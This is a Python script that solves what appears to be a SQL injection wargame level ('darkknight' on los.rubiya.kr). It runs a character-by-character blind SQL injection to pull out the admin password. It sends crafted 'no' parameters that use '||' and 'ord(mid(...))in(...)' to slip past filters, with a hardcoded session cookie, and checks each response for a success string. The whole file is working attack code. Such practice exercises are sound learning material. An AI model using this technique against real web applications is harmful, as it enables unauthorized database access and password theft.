import requests
import string

url="https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php"
cookies={'PHPSESSID':"ci41fo6lumj51dfsglosja6mb2"}
ascii_code=string.digits+string.ascii_letters
utf="utf-8"

print("Find pw is ")
for i in range(1, 9):
    for find in ascii_code:
        params=f"?no=1||no>1 and ord(mid(pw,{i},1))in({ord(find)})"
        find_url=url+params
        response=requests.get(find_url, cookies=cookies)

        if response.text.find("<h2>Hello admin</h2>")>0:
            print(find, end='')
            break

print("\nDONE!")